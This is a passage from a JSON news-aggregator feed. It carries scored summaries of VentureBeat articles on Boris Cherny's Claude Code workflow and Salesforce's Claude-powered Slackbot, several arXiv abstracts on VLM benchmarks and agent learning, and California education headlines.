        "summary": "<p>When the creator of the world&#x27;s most advanced coding agent speaks, Silicon Valley doesn&#x27;t just listen — it takes notes.</p><p>For the past week, the engineering community has been dissecting a <a href=\"https://x.com/bcherny/status/2007179832300581177\">thread on X</a> from <a href=\"https://x.com/bcherny\">Boris Cherny</a>, the creator and head of <a href=\"https://code.claude.com/docs/en/overview\">Claude Code</a> at <a href=\"https://www.anthropic.com/\">Anthropic</a>. What began as a casual sharing of his personal terminal setup has spiraled into a viral manifesto on the future of software development, with industry insiders calling it a watershed moment for the startup.</p><div></div><p>&quot;If you&#x27;re not reading the Claude Code best practices straight from its creator, you&#x27;re behind as a programmer,&quot; wrote <a href=\"https://x.com/jefftangx\">Jeff Tang</a>, a prominent voice in the developer community. <a href=\"https://x.com/KyleMcnease/status/2007555584724480338\">Kyle McNease</a>, another industry observer, went further, declaring that with Cherny&#x27;s &quot;game-changing updates,&quot; Anthropic is &quot;on fire,&quot; potentially facing &quot;their ChatGPT moment.&quot;</p><p>The excitement stems from a paradox: Cherny&#x27;s workflow is surprisingly simple, yet it allows a single human to operate with the output capacity of a small engineering department. As one user noted on X after implementing Cherny&#x27;s setup, the experience &quot;<a href=\"https://x.com/mtwichan\">feels more like Starcraft</a>&quot; than traditional coding — a shift from typing syntax to commanding autonomous units.</p><p>Here is an analysis of the workflow that is reshaping how software gets built, straight from the architect himself. </p><h2><b>How running five AI agents at once turns coding into a real-time strategy game</b></h2><p>The most striking revelation from Cherny&#x27;s disclosure is that he does not code in a linear fashion. In the traditional &quot;<a href=\"https://notes.paulswail.com/public/The+inner+and+outer+loops+of+software+development+workflow\">inner loop</a>&quot; of development, a programmer writes a function, tests it, and moves to the next. Cherny, however, acts as a fleet commander.</p><p>&quot;I run 5 Claudes in parallel in my terminal,&quot; Cherny wrote. &quot;I number my tabs 1-5, and use system notifications to know when a Claude needs input.&quot;</p><p>By utilizing iTerm2 system notifications, Cherny effectively manages five simultaneous work streams. While one agent runs a test suite, another refactors a legacy module, and a third drafts documentation. He also runs &quot;5-10 Claudes on <a href=\"https://claude.ai/\">claude.ai</a>&quot; in his browser, using a &quot;teleport&quot; command to hand off sessions between the web and his local machine.</p><p>This validates the &quot;<a href=\"https://www.cnbc.com/2026/01/03/anthropic-daniela-amodei-do-more-with-less-bet.html\">do more with less</a>&quot; strategy articulated by Anthropic President Daniela Amodei earlier this week. While competitors like OpenAI pursue trillion-dollar infrastructure build-outs, Anthropic is proving that superior orchestration of existing models can yield exponential productivity gains.</p><h2><b>The counterintuitive case for choosing the slowest, smartest model</b></h2><p>In a surprising move for an industry obsessed with latency, Cherny revealed that he exclusively uses Anthropic&#x27;s heaviest, slowest model: <a href=\"https://www.anthropic.com/news/claude-opus-4-5\">Opus 4.5</a>.</p><p>&quot;I use Opus 4.5 with thinking for everything,&quot; Cherny <a href=\"https://x.com/bcherny/status/2007179838864666847\">explained</a>. &quot;It&#x27;s the best coding model I&#x27;ve ever used, and even though it&#x27;s bigger &amp; slower than Sonnet, since you have to steer it less and it&#x27;s better at tool use, it is almost always faster than using a smaller model in the end.&quot;</p><p>For enterprise technology leaders, this is a critical insight. The bottleneck in modern AI development isn&#x27;t the generation speed of the token; it is the human time spent correcting the AI&#x27;s mistakes. Cherny&#x27;s workflow suggests that paying the &quot;compute tax&quot; for a smarter model upfront eliminates the &quot;correction tax&quot; later.</p><h2><b>One shared file turns every AI mistake into a permanent lesson</b></h2><p>Cherny also detailed how his team solves the problem of AI amnesia. Standard large language models do not &quot;remember&quot; a company&#x27;s specific coding style or architectural decisions from one session to the next.</p><p>To address this, Cherny&#x27;s team maintains a single file named <a href=\"https://x.com/bcherny/status/2007179842928947333\">CLAUDE.md</a> in their git repository. &quot;Anytime we see Claude do something incorrectly we add it to the CLAUDE.md, so Claude knows not to do it next time,&quot; he wrote.</p><p>This practice transforms the codebase into a self-correcting organism. When a human developer reviews a pull request and spots an error, they don&#x27;t just fix the code; they tag the AI to update its own instructions. &quot;<a href=\"https://x.com/aakashgupta/status/2007347705945944153\">Every mistake becomes a rule</a>,&quot; noted <a href=\"https://x.com/aakashgupta\">Aakash Gupta</a>, a product leader analyzing the thread. The longer the team works together, the smarter the agent becomes.</p><h2><b>Slash commands and subagents automate the most tedious parts of development</b></h2><p>The &quot;vanilla&quot; workflow one observer praised is powered by rigorous automation of repetitive tasks. Cherny uses slash commands — custom shortcuts checked into the project&#x27;s repository — to handle complex operations with a single keystroke.</p><p>He highlighted a command called <i><b>/commit-push-pr</b></i>, which he invokes dozens of times daily. Instead of manually typing git commands, writing a commit message, and opening a pull request, the agent handles the bureaucracy of version control autonomously.</p><p>Cherny also deploys subagents — specialized AI personas — to handle specific phases of the development lifecycle. He uses a code-simplifier to clean up architecture after the main work is done and a verify-app agent to run end-to-end tests before anything ships.</p><h2><b>Why verification loops are the real unlock for AI-generated code</b></h2><p>If there is a single reason Claude Code has reportedly hit <a href=\"https://www.anthropic.com/news/anthropic-acquires-bun-as-claude-code-reaches-usd1b-milestone\">$1 billion in annual recurring revenue</a> so quickly, it is likely the verification loop. The AI is not just a text generator; it is a tester.</p><p>&quot;Claude tests every single change I land to claude.ai/code using the Claude Chrome extension,&quot; Cherny wrote. &quot;It opens a browser, tests the UI, and iterates until the code works and the UX feels good.&quot;</p><p>He argues that giving the AI a way to verify its own work — whether through browser automation, running bash commands, or executing test suites — improves the quality of the final result by &quot;2-3x.&quot; The agent doesn&#x27;t just write code; it proves the code works.</p><h2><b>What Cherny&#x27;s workflow signals about the future of software engineering</b></h2><p>The reaction to Cherny&#x27;s thread suggests a pivotal shift in how developers think about their craft. For years, &quot;AI coding&quot; meant an autocomplete function in a text editor — a faster way to type. Cherny has demonstrated that it can now function as an operating system for labor itself.</p><p>&quot;Read this if you&#x27;re already an engineer... and want more power,&quot; <a href=\"https://x.com/jefftangx/status/2008246873275215890\">Jeff Tang</a> summarized on X.</p><p>The tools to multiply human output by a factor of five are already here. They require only a willingness to stop thinking of AI as an assistant and start treating it as a workforce. The programmers who make that mental leap first won&#x27;t just be more productive. They&#x27;ll be playing an entirely different game — and everyone else will still be typing.</p>",
        "source": "venturebeat.com",
        "published": "Mon, 05 Jan 2026 07:45:00 GMT",
        "fetched_at": "2026-02-09T23:33:24.833475Z",
        "tags": [
          {
            "name": "transformation",
            "score": 6
          },
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 4
          }
        ],
        "structural_score": 23,
        "timeliness_score": 3,
        "final_score": 13.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://venturebeat.com/technology/salesforce-rolls-out-new-slackbot-ai-agent-as-it-battles-microsoft-and",
        "title": "Salesforce rolls out new Slackbot AI agent as it battles Microsoft and Google in workplace AI",
        "summary": "<p><a href=\"https://www.salesforce.com/\">Salesforce</a> on Tuesday launched an entirely rebuilt version of <a href=\"https://slack.com/help/articles/202026038-An-introduction-to-Slackbot\">Slackbot</a>, the company&#x27;s workplace assistant, transforming it from a simple notification tool into what executives describe as a fully powered AI agent capable of searching enterprise data, drafting documents, and taking action on behalf of employees.</p><p>The new Slackbot, now generally available to <a href=\"https://slack.com/pricing/businessplus\">Business+</a> and <a href=\"https://slack.com/enterprise\">Enterprise+</a> customers, is Salesforce&#x27;s most aggressive move yet to position Slack at the center of the emerging &quot;agentic AI&quot; movement — where software agents work alongside humans to complete complex tasks. The launch comes as Salesforce attempts to convince investors that artificial intelligence will bolster its products rather than render them obsolete.</p><p>&quot;Slackbot isn&#x27;t just another copilot or AI assistant,&quot; said <a href=\"https://www.salesforce.com/company/parker-harris-bio/\">Parker Harris</a>, Salesforce co-founder and Slack&#x27;s chief technology officer, in an exclusive interview with Salesforce. &quot;It&#x27;s the front door to the agentic enterprise, powered by Salesforce.&quot;</p><h2><b>From tricycle to Porsche: Salesforce rebuilt Slackbot from the ground up</b></h2><p>Harris was blunt about what distinguishes the new Slackbot from its predecessor: &quot;The old Slackbot was, you know, a little tricycle, and the new Slackbot is like, you know, a Porsche.&quot;</p><p>The original Slackbot, which has existed since Slack&#x27;s early days, performed basic algorithmic tasks — reminding users to add colleagues to documents, suggesting channel archives, and delivering simple notifications. The new version runs on an entirely different architecture built around a large language model and sophisticated search capabilities that can access Salesforce records, Google Drive files, calendar data, and years of Slack conversations.</p><p>&quot;It&#x27;s two different things,&quot; Harris explained. &quot;The old Slackbot was algorithmic and fairly simple. The new Slackbot is brand new — it&#x27;s based around an LLM and a very robust search engine, and connections to third-party search engines, third-party enterprise data.&quot;</p><p>Salesforce chose to retain the Slackbot brand despite the fundamental technical overhaul. &quot;People know what Slackbot is, and so we wanted to carry that forward,&quot; Harris said.</p><h2><b>Why Anthropic&#x27;s Claude powers the new Slackbot — and which AI models could come next</b></h2><p>The new Slackbot runs on <a href=\"https://claude.ai/\">Claude</a>, Anthropic&#x27;s large language model, a choice driven partly by compliance requirements. Slack&#x27;s commercial service operates under <a href=\"https://www.fedramp.gov/archive/2017-11-16-understanding-baselines-and-impact-levels/\">FedRAMP Moderate certification</a> to serve U.S. federal government customers, and Harris said Anthropic was &quot;the only provider that could give us a compliant LLM&quot; when Slack began building the new system.</p><p>But that exclusivity won&#x27;t last. &quot;We are, this year, going to support additional providers,&quot; Harris said. &quot;We have a great relationship with Google. Gemini is incredible — performance is great, cost is great. So we&#x27;re going to use Gemini for some things.&quot; He added that OpenAI remains a possibility as well.</p><p>Harris echoed Salesforce CEO Marc Benioff&#x27;s view that large language models are becoming commoditized: &quot;You&#x27;ve heard Marc talk about LLMs are commodities, that they&#x27;re democratized. I call them CPUs.&quot;</p><p>On the sensitive question of training data, Harris was unequivocal: Salesforce does not train any models on customer data. &quot;Models don&#x27;t have any sort of security,&quot; he explained. &quot;If we trained it on some confidential conversation that you and I have, I don&#x27;t want Carolyn to know — if I train it into the LLM, there is no way for me to say you get to see the answer, but Carolyn doesn&#x27;t.&quot;</p><h2><b>Inside Salesforce&#x27;s internal experiment: 80,000 employees tested Slackbot with striking results</b></h2><p>Salesforce has been <a href=\"https://www.theverge.com/news/797890/slack-slackbot-ai-assistant-upgrade\">testing the new Slackbot internally for months</a>, rolling it out to all 80,000 employees. According to Ryan Gavin, Slack&#x27;s chief marketing officer, the results have been striking: &quot;It&#x27;s the fastest adopted product in Salesforce history.&quot;</p><p>Internal data shows that two-thirds of Salesforce employees have tried the new Slackbot, with 80% of those users continuing to use it regularly. Internal satisfaction rates reached 96% — the highest for any AI feature Slack has shipped. Employees report saving between two and 20 hours per week.</p><p>The adoption happened largely organically. &quot;I think it was about five days, and a Canvas was developed by our employees called &#x27;The Most Stealable Slackbot Prompts,&#x27;&quot; Gavin said. &quot;People just started adding to it organically. I think it&#x27;s up to 250-plus prompts that are in this Canvas right now.&quot;</p><p>Kate Crotty, a principal UX researcher at Salesforce, found that 73% of internal adoption was driven by social sharing rather than top-down mandates. &quot;Everybody is there to help each other learn and communicate hacks,&quot; she said.</p><h2><b>How Slackbot transforms scattered enterprise data into executive-ready insights</b></h2><p>During a product demonstration, Amy Bauer, Slack&#x27;s product experience designer, showed how Slackbot can synthesize information across multiple sources. In one example, she asked Slackbot to analyze customer feedback from a pilot program, upload an image of a usage dashboard, and have Slackbot correlate the qualitative and quantitative data.</p><p>&quot;This is where Slackbot really earns its keep for me,&quot; Bauer explained. &quot;What it&#x27;s doing is not just simply reading the image — it&#x27;s actually looking at the image and comparing it to the insight it just generated for me.&quot;</p><p>Slackbot can then query Salesforce to find enterprise accounts with open deals that might be good candidates for early access, creating what Bauer called &quot;a really great justification and plan to move forward.&quot; Finally, it can synthesize all that information into a Canvas — Slack&#x27;s collaborative document format — and find calendar availability among stakeholders to schedule a review meeting.</p><p>&quot;Up until this point, we have been working in a one-to-one capacity with Slackbot,&quot; Bauer said. &quot;But one of the benefits that I can do now is take this insight and have it generate this into a Canvas, a shared workspace where I can iterate on it, refine it with Slackbot, or share it out with my team.&quot;</p><p>Rob Seaman, Slack&#x27;s chief product officer, said the Canvas creation demonstrates where the product is heading: &quot;This is making a tool call internally to Slack Canvas to actually write, effectively, a shared document. But it signals where we&#x27;re going with Slackbot — we&#x27;re eventually going to be adding in additional third-party tool calls.&quot;</p><h2><b>MrBeast&#x27;s company became a Slackbot guinea pig—and employees say they&#x27;re saving 90 minutes a day</b></h2><p>Among Salesforce&#x27;s pilot customers is <a href=\"https://www.thecashmerefund.com/portfolio-company/beast-industries\">Beast Industries</a>, the parent company of YouTube star MrBeast. Luis Madrigal, the company&#x27;s chief information officer, joined the launch announcement to describe his experience.</p><p>&quot;As somebody who has rolled out enterprise technologies for over two decades now, this was practically one of the easiest,&quot; Madrigal said. &quot;The plumbing is there. Slack as an implementation, Enterprise Tools — being able to turn on the Slackbot and the Slack AI functionality was as simple as having my team go in, review, do a quick security review.&quot;</p><p>Madrigal said his security team signed off &quot;rather quickly&quot; — unusual for enterprise AI deployments — because Slackbot accesses only the information each individual user already has permission to view. &quot;Given all the guardrails you guys have put into place for Slackbot to be unique and customized to only the information that each individual user has, only the conversations and the Slack rooms and Slack channels that they&#x27;re part of—that made my security team sign off rather quickly.&quot;</p><p>One Beast Industries employee, Sinan, the head of Beast Games marketing, reported saving &quot;at bare minimum, 90 minutes a day.&quot; Another employee, Spencer, a creative supervisor, described it as &quot;an assistant who&#x27;s paying attention when I&#x27;m not.&quot;</p><p>Other pilot customers include Slalom, reMarkable, Xero, Mercari, and Engine. Mollie Bodensteiner, SVP of Operations at Engine, called Slackbot &quot;an absolute &#x27;chaos tamer&#x27; for our team,&quot; estimating it saves her about 30 minutes daily &quot;just by eliminating context switching.&quot;</p><h2><b>Slackbot vs. Microsoft Copilot vs. Google Gemini: The fight for enterprise AI dominance</b></h2><p>The launch puts Salesforce in direct competition with <a href=\"https://copilot.microsoft.com/\">Microsoft&#x27;s Copilot</a>, which is integrated into Teams and the broader Microsoft 365 suite, as well as Google&#x27;s Gemini integrations across Workspace. When asked what distinguishes Slackbot from these alternatives, Seaman pointed to context and convenience.</p><p>&quot;The thing that makes it most powerful for our customers and users is the proximity — it&#x27;s just right there in your Slack,&quot; Seaman said. &quot;There&#x27;s a tremendous convenience affordance that&#x27;s naturally built into it.&quot;</p><p>The deeper advantage, executives argue, is that Slackbot already understands users&#x27; work without requiring setup or training. &quot;Most AI tools sound the same no matter who is using them,&quot; the company&#x27;s announcement stated. &quot;They lack context, miss nuance, and force you to jump between tools to get anything done.&quot;</p><p>Harris put it more directly: &quot;If you&#x27;ve ever had that magic experience with AI — I think ChatGPT is a great example, it&#x27;s a great experience from a consumer perspective — Slackbot is really what we&#x27;re doing in the enterprise, to be this employee super agent that is loved, just like people love using Slack.&quot;</p><p>Amy Bauer emphasized the frictionless nature of the experience. &quot;Slackbot is inherently grounded in the context, in the data that you have in Slack,&quot; she said. &quot;So as you continue working in Slack, Slackbot gets better because it&#x27;s grounded in the work that you&#x27;re doing there. There is no setup. There is no configuration for those end users.&quot;</p><h2><b>Salesforce&#x27;s ambitious plan to make Slackbot the one &#x27;super agent&#x27; that controls all the others</b></h2><p>Salesforce positions Slackbot as what Harris calls a &quot;super agent&quot; — a central hub that can eventually coordinate with other AI agents across an organization.</p><p>&quot;Every corporation is going to have an employee super agent,&quot; Harris said. &quot;Slackbot is essentially taking the magic of what Slack does. We think that Slackbot, and we&#x27;re really excited about it, is going to be that.&quot;</p><p>The vision extends to third-party agents already launching in Slack. Last month, Anthropic released a preview of Claude Code for Slack, allowing developers to interact with Claude&#x27;s coding capabilities directly in chat threads. OpenAI, Google, Vercel, and others have also built agents for the platform.</p><p>&quot;Most of the net-new apps that are being deployed to Slack are agents,&quot; Seaman noted during the press conference. &quot;This is proof of the promise of humans and agents coexisting and working together in Slack to solve problems.&quot;</p><p>Harris described a future where Slackbot becomes an <a href=\"https://modelcontextprotocol.io/docs/learn/client-concepts\">MCP (Model Context Protocol) client</a>, able to leverage tools from across the software ecosystem — similar to how the developer tool Cursor works. &quot;Slack can be an MCP client, and Slackbot will be the hub of that, leveraging all these tools out in the world, some of which will be these amazing agents,&quot; he said.</p><p>But Harris also cautioned against over-promising on multi-agent coordination. &quot;I still think we&#x27;re in the single agent world,&quot; he said. &quot;FY26 is going to be the year where we started to see more coordination. But we&#x27;re going to do it with customer success in mind, and not demonstrate and talk about, like, &#x27;I&#x27;ve got 1,000 agents working together,&#x27; because I think that&#x27;s unrealistic.&quot;</p><h2><b>Slackbot costs nothing extra, but Salesforce&#x27;s data access fees could squeeze some customers</b></h2><p>Slackbot is included at no additional cost for customers on <a href=\"https://slack.com/pricing/businessplus\">Business+</a> and <a href=\"https://slack.com/enterprise\">Enterprise+</a> plans. &quot;There&#x27;s no additional fees customers have to do,&quot; Gavin confirmed. &quot;If they&#x27;re on one of those plans, they&#x27;re going to get Slackbot.&quot;</p><p>However, some enterprise customers may face other cost pressures related to Salesforce&#x27;s broader data strategy. CIOs may see price increases for third-party applications that work with Salesforce data, as effects of higher charges for API access ripple through the software supply chain.</p><p>Fivetran CEO George Fraser has warned that Salesforce&#x27;s shift in pricing policy for API access could have tangible consequences for enterprises relying on Salesforce as a system of record. &quot;They might not be able to use Fivetran to replicate their data to Snowflake and instead have to use Salesforce Data Cloud. Or they might find that they are not able to interact with their data via ChatGPT, and instead have to use Agentforce,&quot; Fraser said in a <a href=\"https://www.cio.com/article/4108001/salesforce-is-tightening-control-of-its-data-ecosystem-and-cios-may-have-to-pay-the-price.html\">recent CIO report</a>.</p><p>Salesforce has framed the pricing change as standard industry practice.</p><h2><b>What Slackbot can do today, what&#x27;s coming in weeks, and what&#x27;s still on the roadmap</b></h2><p>The new Slackbot begins rolling out today and will reach all eligible customers by the end of February. Mobile availability will complete by March 3, Bauer confirmed during her interview with VentureBeat.</p><p>Some capabilities remain works in progress. Calendar reading and availability checking are available at launch, but the ability to actually book meetings is &quot;coming a few weeks after,&quot; according to Seaman. Image generation is not currently supported, though Bauer said it&#x27;s &quot;something that we are looking at in the future.&quot;</p><p>When asked about integration with competing CRM systems like <a href=\"https://www.hubspot.com/\">HubSpot</a> and <a href=\"https://www.microsoft.com/en-us/dynamics-365\">Microsoft Dynamics</a>, Salesforce representatives declined to provide specifics during the interview, though they acknowledged the question touched on key competitive differentiators.</p><h2><b>Salesforce is betting the future of work looks like a chat window—and it&#x27;s not alone</b></h2><p>The Slackbot launch is Salesforce&#x27;s bet that the future of enterprise work is conversational — that employees will increasingly prefer to interact with AI through natural language rather than navigating traditional software interfaces.</p><p>Harris described Slack&#x27;s product philosophy using principles like &quot;don&#x27;t make me think&quot; and &quot;be a great host.&quot; The goal, he said, is for Slackbot to surface information proactively rather than requiring users to hunt for it.</p><p>&quot;One of the revelations for me is LLMs applied to unstructured information are incredible,&quot; Harris said. &quot;And the amount of value you have if you&#x27;re a Slack user, if your corporation uses Slack — the amount of value in Slack is unbelievable. Because you&#x27;re talking about work, you&#x27;re sharing documents, you&#x27;re making decisions, but you can&#x27;t as a human go through that and really get the same value that an LLM can do.&quot;</p><p>Looking ahead, Harris expects the interfaces themselves to evolve beyond pure conversation. &quot;We&#x27;re kind of saturating what we can do with purely conversational UIs,&quot; he said. &quot;I think we&#x27;ll start to see agents building an interface that best suits your intent, as opposed to trying to surface something within a conversational interface that matches your intent.&quot;</p><p>Microsoft, Google, and a growing roster of AI startups are placing similar bets — that the winning enterprise AI will be the one embedded in the tools workers already use, not another application to learn. The race to become that invisible layer of workplace intelligence is now fully underway.</p><p>For Salesforce, the stakes extend beyond a single product launch. After a <a href=\"https://www.investopedia.com/can-salesforce-stock-recover-here-s-what-wall-street-thinks-crm-earnings-11862399\">bruising year</a> on Wall Street and persistent questions about whether AI threatens its core business, the company is wagering that Slackbot can prove the opposite — that the tens of millions of people already chatting in Slack every day is not a vulnerability, but an unassailable advantage.</p><p>Haley Gault, the Salesforce account executive in Pittsburgh who stumbled upon the new Slackbot on a snowy morning, captured the shift in a single sentence: &quot;I honestly can&#x27;t imagine working for another company not having access to these types of tools. This is just how I work now.&quot;</p><p>That&#x27;s precisely what Salesforce is counting on.</p>",
        "source": "venturebeat.com",
        "published": "Tue, 13 Jan 2026 13:00:00 GMT",
        "fetched_at": "2026-02-09T23:33:24.833460Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 4
          },
          {
            "name": "ontology_shift",
            "score": 8
          }
        ],
        "structural_score": 22,
        "timeliness_score": 3,
        "final_score": 12.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://arxiv.org/abs/2512.24985",
        "title": "DarkEQA: Benchmarking Vision-Language Models for Embodied Question Answering in Low-Light Indoor Environments",
        "summary": "arXiv:2512.24985v3 Announce Type: replace-cross \nAbstract: Vision Language Models (VLMs) are increasingly adopted as central reasoning modules for embodied agents. Existing benchmarks evaluate their capabilities under ideal, well-lit conditions, yet robust 24/7 operation demands performance under a wide range of visual degradations, including low-light conditions at night or in dark environments--a core necessity that has been largely overlooked. To address this underexplored challenge, we present DarkEQA, an open-source benchmark for evaluating EQA-relevant perceptual primitives under multi-level low-light conditions. DarkEQA isolates the perception bottleneck by evaluating question answering from egocentric observations under controlled degradations, enabling attributable robustness analysis. A key design feature of DarkEQA is its physical fidelity: visual degradations are modeled in linear RAW space, simulating physics-based illumination drop and sensor noise followed by an ISP-inspired rendering pipeline. We demonstrate the utility of DarkEQA by evaluating a wide range of state-of-the-art VLMs and Low-Light Image Enhancement (LLIE) models. Our analysis systematically reveals VLMs' limitations when operating under these challenging visual conditions. Project website: https://darkeqa-benchmark.github.io/",
        "source": "export.arxiv.org",
        "published": "Mon, 09 Feb 2026 00:00:00 -0500",
        "fetched_at": "2026-02-09T23:33:20.661127Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 8
          }
        ],
        "structural_score": 18,
        "timeliness_score": 5,
        "final_score": 11.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 15.4,
        "temp_score_trend": 7.6
      },
      {
        "url": "https://arxiv.org/abs/2512.24985",
        "title": "DarkEQA: Benchmarking Vision-Language Models for Embodied Question Answering in Low-Light Indoor Environments",
        "summary": "arXiv:2512.24985v3 Announce Type: replace-cross \nAbstract: Vision Language Models (VLMs) are increasingly adopted as central reasoning modules for embodied agents. Existing benchmarks evaluate their capabilities under ideal, well-lit conditions, yet robust 24/7 operation demands performance under a wide range of visual degradations, including low-light conditions at night or in dark environments--a core necessity that has been largely overlooked. To address this underexplored challenge, we present DarkEQA, an open-source benchmark for evaluating EQA-relevant perceptual primitives under multi-level low-light conditions. DarkEQA isolates the perception bottleneck by evaluating question answering from egocentric observations under controlled degradations, enabling attributable robustness analysis. A key design feature of DarkEQA is its physical fidelity: visual degradations are modeled in linear RAW space, simulating physics-based illumination drop and sensor noise followed by an ISP-inspired rendering pipeline. We demonstrate the utility of DarkEQA by evaluating a wide range of state-of-the-art VLMs and Low-Light Image Enhancement (LLIE) models. Our analysis systematically reveals VLMs' limitations when operating under these challenging visual conditions. Project website: https://darkeqa-benchmark.github.io/",
        "source": "export.arxiv.org",
        "published": "Mon, 09 Feb 2026 00:00:00 -0500",
        "fetched_at": "2026-02-09T23:33:21.993309Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 8
          }
        ],
        "structural_score": 18,
        "timeliness_score": 5,
        "final_score": 11.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://arxiv.org/abs/2601.18778",
        "title": "Teaching Models to Teach Themselves: Reasoning at the Edge of Learnability",
        "summary": "arXiv:2601.18778v2 Announce Type: replace \nAbstract: Can a model learn to escape its own learning plateau? Reinforcement learning methods for finetuning large reasoning models stall on datasets with low initial success rates, and thus little training signal. We investigate a fundamental question: Can a pretrained LLM leverage latent knowledge to generate an automated curriculum for problems it cannot solve? To explore this, we design SOAR: A self-improvement framework designed to surface these pedagogical signals through meta-RL. A teacher copy of the model proposes synthetic problems for a student copy, and is rewarded with its improvement on a small subset of hard problems. Critically, SOAR grounds the curriculum in measured student progress rather than intrinsic proxy rewards. Our study on the hardest subsets of mathematical benchmarks (0/128 success) reveals three core findings. First, we show that it is possible to realize bi-level meta-RL that unlocks learning under sparse, binary rewards by sharpening a latent capacity of pretrained models to generate useful stepping stones. Second, grounded rewards outperform intrinsic reward schemes used in prior LLM self-play, reliably avoiding the instability and diversity collapse modes they typically exhibit. Third, analyzing the generated questions reveals that structural quality and well-posedness are more critical for learning progress than solution correctness. Our results suggest that the ability to generate useful stepping stones does not require the preexisting ability to actually solve the hard problems, paving a principled path to escape reasoning plateaus without additional curated data.",
        "source": "export.arxiv.org",
        "published": "Mon, 09 Feb 2026 00:00:00 -0500",
        "fetched_at": "2026-02-09T23:33:21.993024Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "ontology_shift",
            "score": 8
          }
        ],
        "structural_score": 16,
        "timeliness_score": 5,
        "final_score": 10.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 13.8,
        "temp_score_trend": 7.2
      },
      {
        "url": "https://arxiv.org/abs/2602.06052",
        "title": "Rethinking Memory Mechanisms of Foundation Agents in the Second Half",
        "summary": "arXiv:2602.06052v1 Announce Type: cross \nAbstract: The research of artificial intelligence is undergoing a paradigm shift from prioritizing model innovations over benchmark scores towards emphasizing problem definition and rigorous real-world evaluation. As the field enters the \"second half,\" the central challenge becomes real utility in long-horizon, dynamic, and user-dependent environments, where agents face context explosion and must continuously accumulate, manage, and selectively reuse large volumes of information across extended interactions. Memory, with hundreds of papers released this year, therefore emerges as the critical solution to fill the utility gap. In this survey, we provide a unified view of foundation agent memory along three dimensions: memory substrate (internal and external), cognitive mechanism (episodic, semantic, sensory, working, and procedural), and memory subject (agent- and user-centric). We then analyze how memory is instantiated and operated under different agent topologies and highlight learning policies over memory operations. Finally, we review evaluation benchmarks and metrics for assessing memory utility, and outline various open challenges and future directions.",
        "source": "export.arxiv.org",
        "published": "Mon, 09 Feb 2026 00:00:00 -0500",
        "fetched_at": "2026-02-09T23:33:20.659946Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "value_redefinition",
            "score": 12
          }
        ],
        "structural_score": 14,
        "timeliness_score": 5,
        "final_score": 9.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 12.200000000000001,
        "temp_score_trend": 6.800000000000001
      }
    ],
    "education": [
      {
        "url": "https://edsource.org/2025/how-one-california-school-came-together-to-pack-20000-meals-for-the-holidays/746481",
        "title": "How one California school came together to pack 20,000 meals for the holidays",
        "summary": "At an Elk Grove high school in Sacramento County, students worked a night in the cafeteria to combat global food insecurity.",
        "source": "edsource.org",
        "published": "Mon, 08 Dec 2025 08:03:00 +0000",
        "fetched_at": "2026-02-09T23:33:59.059913Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 9,
        "timeliness_score": 3,
        "final_score": 6.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://edsource.org/2025/fresno-unified-data-error-analysis/738872",
        "title": "Fresno Unified error skews state teacher data, analysis shows",
        "summary": "A mistake made by a staff member deflated claims that the state added 3,000 new teachers to its ranks between 2020 and 2024.",
        "source": "edsource.org",
        "published": "Tue, 19 Aug 2025 19:26:35 +0000",
        "fetched_at": "2026-02-09T23:33:59.060979Z",
        "tags": [
          {
            "name": "transformation",
            "score": 6
          },
          {
            "name": "boundary_crossing",
            "score": 2
          }
        ],
        "structural_score": 8,
        "timeliness_score": 3,
        "final_score": 5.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://edsource.org/2026/technology-education-student-wellbeing/749262",
        "title": "Rethinking screen time in California classrooms",
        "summary": "Effective instruction requires a balance between traditional methods and digital engagement. Here's what school districts, families and the state must do.",
        "source": "edsource.org",
        "published": "Tue, 20 Jan 2026 02:58:44 +0000",
        "fetched_at": "2026-02-09T23:33:59.059557Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "value_redefinition",
            "score": 4
          }
        ],
        "structural_score": 6,
        "timeliness_score": 3,
        "final_score": 4.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://edsource.org/2026/california-universal-prekindergarten-implementation/748208",
        "title": "Universal prekindergarten has arrived; now we must sustain it",
        "summary": "County offices of education across the state are calling on the governor and the Legislature to support universal prekindergarten with sustained funding.",
        "source": "edsource.org",
        "published": "Tue, 06 Jan 2026 03:38:57 +0000",
        "fetched_at": "2026-02-09T23:33:59.059694Z",
        "tags": [
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 5,
        "timeliness_score": 3,
        "final_score": 4.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://edsource.org/2025/california-schools-to-use-reading-screening-test/733022",
        "title": "California schools prepare to introduce universal reading screening",
        "summary": "A quick screening test will be administered to all students in kindergarten through second grade to detect possible reading difficulties, but it is not intended to be a final diagnosis.",
        "source": "edsource.org",
        "published": "Tue, 20 May 2025 07:05:00 +0000",
        "fetched_at": "2026-02-09T23:33:59.061648Z",
        "tags": [
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 5,
        "timeliness_score": 3,
        "final_score": 4.0,
        "reddit_score": null,
        "reddit_comments": null
      },
